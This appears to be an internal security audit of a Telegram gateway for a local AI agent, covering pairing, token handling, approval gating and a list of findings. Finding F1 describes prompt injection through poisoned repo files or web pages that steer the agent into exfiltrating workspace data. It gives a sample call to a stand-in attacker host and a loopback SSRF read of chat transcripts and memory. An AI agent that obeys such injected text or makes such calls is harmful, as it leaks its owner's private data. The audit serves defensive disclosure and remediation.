# Telegram Gateway — Security Audit

Scope: the `hivemind_gateway/` package as of 2026-10-05 (post-WP2,
commits up to the master-switch hardening). Method: static code review
of the gateway AND the core paths it leans on (tools, approvals,
workspace guards, settings API), plus everything the first real-run
round shook loose. Each finding states its evidence and whether it is
fixed, mitigated, or a planned follow-up.

## Threat model — five adversaries

| Adversary | What they want | Verdict |
|---|---|---|
| A stranger on Telegram | run code, read files | Blocked at the door (see S1) |
| Someone with the bot token | impersonate the gateway, read chats | Partially contained (F6) |
| Malicious CONTENT the agent reads (prompt injection) | steer the agent | Partially contained — biggest open area (F1) |
| Malware on the same PC | steal the token / flip state | Out of scope: same-user code execution is game over on any local app (F8) |
| Whoever takes over the owner's Telegram account | full agent control | Only as strong as the account (F9) |

## What holds (verified, not assumed)

- **Owner-only, private-only.** Whitelist on `from.id` + `chat.type ==
  private` for every handled update type; everything else is dropped
  with a rate-limited log line and never answered. Verified by suite
  (`test_gateway_auth.py`) and by the real run.
- **Pairing anchored to the console.** One-time base32 code (≥40 bit
  entropy), 5 min TTL, single use, constant-time compare, 5 global
  failures lock until restart. Wrong attempts are silent on the phone —
  a bug found in the real run (silent-by-design now, crash before).
- **No listening surface.** Outbound long-polling only; no webhook, no
  open port. Loopback-only to HiveMind (config refuses anything else).
  A second poller on the token makes the gateway exit loudly (exit 3).
- **Token hygiene.** Token only from env/Credential Manager, redaction
  filter on every log record (scrubs literal tokens AND bot-URL
  patterns — confirmed working in the live console), leak-checked out
  of release zips, `.gitignore`d state.
- **Fail-closed master switch.** The gateway refuses to start unless
  `telegram_enabled = true` (config) or `HIVEMIND_GATEWAY_ENABLED=1`
  (env). Off by default, and the local kill-switch file always wins.
- **At-most-once runs.** Telegram offset persisted before processing;
  60 s replay window; update-id dedupe; forwarded messages never parse
  as commands.
- **Workspace confinement of the agent** — verified against the REAL
  handler, offline: absolute outside paths and `../` traversal rejected
  with `PATH_OUTSIDE_WORKSPACE` (tools/handlers/file_ops.py:98 →
  utils/file.py). The historical `workspace_lock=None` hole is fixed in
  core (duo_runner.py:6013, CRITIC-LOCK).
- **Approval-gated tools auto-denied** until tappable approvals ship:
  the gateway answers every `approval_request` with `"3"` and says so
  on the phone. Server-side timeout expiry is fail-closed deny too
  (corrected during WP0; test-verified in `test_approval_timeout.py`).

## Findings

### F1 — HIGH (design gap until the remote profile ships): the phone runs the full agent minus gated tools

Auto-deny covers only the eight gated tools (`_APPROVAL_TOOLS`).
Everything ungated runs with normal permissions: all read/search tools
(workspace-confined — that part holds), but also **web_search and
web_fetch with arbitrary URLs, and no SSRF guard**: no loopback/private
target blocking exists in the web tool path (checked — nothing rejects
`http://127.0.0.1:8001/...`).

Consequences, in order of realism:

1. **Data exfiltration via web fetch.** Prompt injection (a poisoned
   repo file or web page the agent reads) can ask the agent to
   `web_fetch("https://attacker.example/?d=<workspace data>")`. The
   data travels in the URL; GET-only does not help. The secret filter
   scrubs the ANSWER to the phone, not outbound requests.
2. **Two-hop internal read.** `web_fetch` can read the engine's own
   loopback API into the tool result: `/chats` (all chat transcripts),
   `/memory`, `/settings` (the git token is masked there — verified —
   but user data is not). A second fetch exfiltrates it.

**Mitigations now:** scratch-workspace rule for the phone (setup guide),
auto-deny, workspace confinement. **Fix plan:** the remote profile
(WP3) must include a web-tool policy — either disable web tools for
`source:"telegram"` runs or restrict to an allowlist — plus a small
core hardening: web_fetch refuses loopback/private targets unless
explicitly enabled. Both need an owner go (core change).

### F2 — MEDIUM: `run_tests` is ungated dead code

`run_tests` is not in `_APPROVAL_TOOLS`, but currently refuses with
"test runner not wired" (tools/handlers/exec_tools.py:486). The moment
someone wires a real runner, an arbitrary-code-execution tool exists
OUTSIDE the approval gate. One-line core hardening: add `run_tests` to
`_APPROVAL_TOOLS` now, before it can bite. Needs owner go.

### F3 — MEDIUM: no startup identity check of the engine

The brief requires the gateway to read `/health` at startup and refuse
unknown response shapes. Today it starts blind and fails later with
readable per-command errors — annoying, not dangerous (the loopback
bind plus loopback-only config means it talks to whatever is on
8001 on THIS machine). Follow-up: health check + shape validation at
startup.

### F4 — FIXED: enforced fail-closed master switch + remote off switch

Was: the gateway was "opt-in" only in the sense that a human had to
start it — nothing enforced configuration. Now:

- `telegram_enabled` (default **false**) in gateway.toml, or env
  `HIVEMIND_GATEWAY_ENABLED=1`; the gateway refuses to start otherwise.
- **UI veto (planned, spec for the frontend):** HiveMind settings get a
  `telegram_gateway_enabled` key (default absent/false). The gateway
  polls `/settings` every loop iteration (loopback, cheap); key present
  and false → clean shutdown. Key absent → the local switch decides
  (backward compatible). UI placement: settings section under Git
  credentials, per owner request. The installer gains an optional
  "Telegram gateway" step that writes gateway.toml with
  `telegram_enabled = true` only when the user opts in — default
  installs never create it, so the gateway cannot start.

Result: three independent off switches (kill-switch file, master
switch, UI veto) and zero ways to listen when everything is off —
matching the "attacker gets the whole PC" risk class.

### F5 — LOW: pairing lockout is global

Five wrong `/pair` attempts lock pairing until restart, globally. A
stranger who finds the bot can close the pairing window (annoyance, not
a breach; restart prints a fresh code). Release-note material.

### F6 — LOW: token readable by same-user processes

The env var is readable by any process running as the same user. On a
single-user home PC this is equivalent to "the PC is compromised" —
accepted. The Credential Manager path (keyring) exists for the more
paranoid setup. Token theft from Telegram's side is revocable in
seconds via BotFather `/revoke`.

### F7 — LOW: audit log not implemented yet

Evidence trail is currently the gateway console + engine log. WP6 adds
the rotating JSONL audit log (every update hash, every pairing attempt,
every approval decision). Until then, incidents are reconstructed from
console/log files.

### F8 — INFO: local malware is out of scope

Same-user malware can read the token, edit state, delete the kill
switch. That is true of every local app including the engine itself;
the gateway does not claim to contain an already-compromised host.

### F9 — INFO: the Telegram account is the crown jewel

Account takeover = full agent control with a paired phone. 2FA
(Cloud Password) is a hard requirement in the setup guide; session
hygiene recommended. Bot chats are not end-to-end encrypted — content
sits on Telegram servers; the outbound secret filter is a net, not a
guarantee.

### F10 — INFO: busy check is a heuristic until WP3

The "one run at a time" check combines gateway state with a journal
poll; a race can still start a second engine run (8 GB VRAM makes this
ugly, not fatal). The server-side 409 guard (WP3 proposal) is the real
fix.

## Attack walkthroughs (what would actually happen)

- **Stranger finds the bot:** their messages are classified
  `unknown_user` (paired) or `pair_window` (unpaired, only /pair
  accepted) and dropped without answer. Pairing brute force dies at 5
  tries against a ≥40-bit code.
- **Stolen bot token:** they can read the bot's Telegram chats and
  send AS the bot, but the gateway polls with offset-to-newest at
  startup and their messages to the owner's chat do not carry the
  owner id — nothing routes. Owner revokes via /revoke; attacker loses
  the bot entirely.
- **Poisoned web page / repo file:** can steer the agent within F1's
  bounds: read workspace files, fetch web — until WP3 lands, that
  combination is the exfil path to take seriously. Writes and shell
  stay denied.
- **Malware on the PC:** out of scope (F8), same as for every local
  tool.

## Required follow-ups (need owner go — core/frontend)

1. WP3 remote profile MUST define a web-tool policy for phone runs
   (F1) + `web_fetch` loopback/private deny (small core change).
2. Add `run_tests` to `_APPROVAL_TOOLS` (F2, one line).
3. Frontend: `telegram_gateway_enabled` toggle under Git credentials
   (F4 spec above) — writes the settings key via the existing
   POST /settings; no core change needed.
4. Installer: optional "Telegram gateway" step (F4 spec) — writes
   gateway.toml only on explicit opt-in.
5. Startup `/health` shape check (F3, gateway-side, no core change).
